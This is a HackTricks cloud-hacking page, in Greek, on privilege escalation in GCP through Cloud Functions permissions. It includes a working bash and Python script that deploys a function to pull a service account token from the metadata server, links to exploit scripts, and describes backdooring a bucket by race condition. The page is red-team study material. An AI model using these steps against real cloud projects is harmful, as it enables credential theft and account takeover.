# GCP - Cloudfunctions Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## cloudfunctions

Περισσότερες πληροφορίες σχετικά με τις Cloud Functions:

{% content-ref url="../gcp-services/gcp-cloud-functions-enum.md" %}
[gcp-cloud-functions-enum.md](../gcp-services/gcp-cloud-functions-enum.md)
{% endcontent-ref %}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Ένας επιτιθέμενος με αυτά τα δικαιώματα μπορεί να **δημιουργήσει μια νέα Cloud Function με αυθαίρετο (κακόβουλο) κώδικα και να της αναθέσει έναν Service Account**. Στη συνέχεια, να διαρρεύσει το token του Service Account από τα μεταδεδομένα για να κλιμακώσει τα δικαιώματα σε αυτόν.\
Ορισμένα δικαιώματα για να ενεργοποιηθεί η λειτουργία μπορεί να απαιτούνται.

Τα σενάρια εκμετάλλευσης για αυτή τη μέθοδο μπορούν να βρεθούν [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) και [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) και το προεγκατεστημένο αρχείο .zip μπορεί να βρεθεί [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Ένας επιτιθέμενος με αυτά τα δικαιώματα μπορεί να **τροποποιήσει τον κώδικα μιας Function και ακόμη και να τροποποιήσει τον service account που είναι συνδεδεμένος** με στόχο την εξαγωγή του token.

{% hint style="danger" %}
Για να αναπτύξετε cloud functions θα χρειαστείτε επίσης δικαιώματα actAs πάνω στον προεπιλεγμένο service account υπολογιστή ή πάνω στον service account που χρησιμοποιείται για την κατασκευή της εικόνας.
{% endhint %}

Ορισμένα επιπλέον δικαιώματα όπως η άδεια `.call` για την έκδοση 1 cloudfunctions ή ο ρόλος `role/run.invoker` για να ενεργοποιήσετε τη λειτουργία μπορεί να απαιτούνται.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
{% hint style="danger" %}
Αν λάβετε το σφάλμα `Permission 'run.services.setIamPolicy' denied on resource...` είναι επειδή χρησιμοποιείτε την παράμετρο `--allow-unauthenticated` και δεν έχετε αρκετά δικαιώματα γι' αυτό.
{% endhint %}

Το exploit script για αυτή τη μέθοδο μπορεί να βρεθεί [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Με αυτή την άδεια μπορείτε να αποκτήσετε μια **υπογεγραμμένη διεύθυνση URL για να μπορέσετε να ανεβάσετε ένα αρχείο σε έναν κάδο λειτουργίας (αλλά ο κώδικας της λειτουργίας δεν θα αλλάξει, πρέπει ακόμα να τον ενημερώσετε)**

{% code overflow="wrap" %}
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
{% endcode %}

Δεν είμαι σίγουρος πόσο χρήσιμη είναι μόνο αυτή η άδεια από την προοπτική ενός επιτιθέμενου, αλλά καλό είναι να το γνωρίζουμε.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Δώστε στον εαυτό σας οποιαδήποτε από τα προηγούμενα **`.update`** ή **`.create`** προνόμια για να κλιμακώσετε.

### `cloudfunctions.functions.update`

Μόνο με **`cloudfunctions`** δικαιώματα, χωρίς **`iam.serviceAccounts.actAs`** δεν **θα μπορείτε να ενημερώσετε τη λειτουργία, ΟΠΟΤΕ ΑΥΤΟ ΔΕΝ ΕΙΝΑΙ ΜΙΑ ΕΓΚΥΡΗ ΚΛΙΜΑΚΩΣΗ.**

### Πρόσβαση Ανάγνωσης & Εγγραφής πάνω από τον κάδο

Εάν έχετε πρόσβαση ανάγνωσης και εγγραφής πάνω από τον κάδο, μπορείτε να παρακολουθείτε τις αλλαγές στον κώδικα και όποτε **γίνεται ενημέρωση στον κάδο μπορείτε να ενημερώσετε τον νέο κώδικα με τον δικό σας κώδικα** ώστε η νέα έκδοση της Cloud Function να εκτελείται με τον υποβληθέντα κώδικα με backdoor.

Μπορείτε να ελέγξετε περισσότερα σχετικά με την επίθεση στο:

{% content-ref url="gcp-storage-privesc.md" %}
[gcp-storage-privesc.md](gcp-storage-privesc.md)
{% endcontent-ref %}

Ωστόσο, δεν μπορείτε να το χρησιμοποιήσετε για να προ-συμβιβάσετε τρίτες Cloud Functions, διότι αν δημιουργήσετε τον κάδο στον λογαριασμό σας και του δώσετε δημόσιες άδειες ώστε το εξωτερικό έργο να μπορεί να γράψει πάνω του, λαμβάνετε το εξής σφάλμα:

<figure><img src="../../../.gitbook/assets/image.png" alt="" width="304"><figcaption></figcaption></figure>

{% hint style="danger" %}
Ωστόσο, αυτό θα μπορούσε να χρησιμοποιηθεί για επιθέσεις DoS.
{% endhint %}

### Πρόσβαση Ανάγνωσης & Εγγραφής πάνω από το Artifact Registry

Όταν δημιουργείται μια Cloud Function, μια νέα εικόνα docker αποστέλλεται στο Artifact Registry του έργου. Προσπάθησα να τροποποιήσω την εικόνα με μια νέα και ακόμη και να διαγράψω την τρέχουσα εικόνα (και την εικόνα `cache`) και τίποτα δεν άλλαξε, η cloud function συνεχίζει να λειτουργεί. Επομένως, ίσως **να είναι δυνατό να εκμεταλλευτείτε μια επίθεση Race Condition** όπως με τον κάδο για να αλλάξετε το docker container που θα εκτελείται, αλλά **απλά τροποποιώντας την αποθηκευμένη εικόνα δεν είναι δυνατό να συμβιβάσετε την Cloud Function**.

## Αναφορές

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
